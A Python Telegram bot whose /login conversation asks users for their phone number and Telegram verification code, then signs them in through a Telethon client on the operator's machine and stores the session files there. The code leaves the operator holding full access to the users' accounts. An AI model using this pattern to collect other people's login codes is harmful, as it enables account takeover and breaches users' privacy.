import os
from dotenv import load_dotenv
import logging

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    filters,
    CallbackContext,
)
from telethon import TelegramClient


load_dotenv()

logger = logging.getLogger("my logger")

# Create a handler
c_handler = logging.StreamHandler()

# link handler to logger
logger.addHandler(c_handler)

# Set logging level to the logger
logger.setLevel(logging.INFO)

bot_token = os.getenv("BOT_TOKEN")
web_api_id = os.getenv("API_ID")
web_api_hash = os.getenv("API_HASH")

# Store user sessions
user_sessions = {}

# Conversation states
ENTER_PHONE, ENTER_CODE = range(2)


async def start(update: Update, context: CallbackContext):
    """Send a welcome message and guide users to login."""
    await update.message.reply_text("Welcome! Use /login to authenticate.")


# async def handle_message(update: Update, context: CallbackContext):
#     """Handles all non-command messages."""
#     user_text = update.message.text
#     await update.message.reply_text(f"I am not capable of understanding that :( ")


async def login(update: Update, context: CallbackContext):
    """Initiate the login process."""
    await update.message.reply_text(
        "Please enter your phone number (with country code, e.g., +123456789)."
    )
    logger.info("Log in initiated")

    return ENTER_PHONE


async def get_phone_number(update: Update, context: CallbackContext):
    """Receive and validate the phone number."""
    phone_number = update.message.text
    user_id = update.message.chat_id

    # Create a unique session for the user
    session_name = f"user_{user_id}HELLO1"

    logger.info(f"Starting session  :  {session_name}")
    client = TelegramClient(session_name, web_api_id, web_api_hash)

    user_sessions[user_id] = {"client": client, "phone": phone_number}

    await client.connect()
    logger.info(f"client connected")
    try:
        # Send authentication request
        await client.send_code_request(phone_number)
        logger.info(f"Phone number entered")
        await update.message.reply_text(
            "A verification code has been sent to your Telegram app. Please enter it:"
        )
        return ENTER_CODE
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")
        client.disconnect()
        return ConversationHandler.END


async def get_code(update: Update, context: CallbackContext):
    """Verify the entered code."""
    user_id = update.message.chat_id
    code = update.message.text

    if user_id not in user_sessions:
        await update.message.reply_text("Session expired. Please use /login again.")
        return ConversationHandler.END

    client = user_sessions[user_id]["client"]
    phone_number = user_sessions[user_id]["phone"]

    try:
        # Authenticate the user
        await client.sign_in(phone_number, code)

        # Get user details
        me = await client.get_me()
        await update.message.reply_text(f"Login successful! Welcome, {me.first_name}.")
        # logic for
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"Login failed: {e}")
        client.disconnect()
        return ConversationHandler.END


async def cancel(update: Update, context: CallbackContext):
    """Handle user cancellation."""
    await update.message.reply_text("Login process canceled.")

    return ConversationHandler.END


def main():
    """Start the bot."""

    app = Application.builder().token(bot_token).build()

    # app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("login", login)],
        states={
            ENTER_PHONE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone_number)
            ],
            ENTER_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    logger.info("Started")

    print("Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()
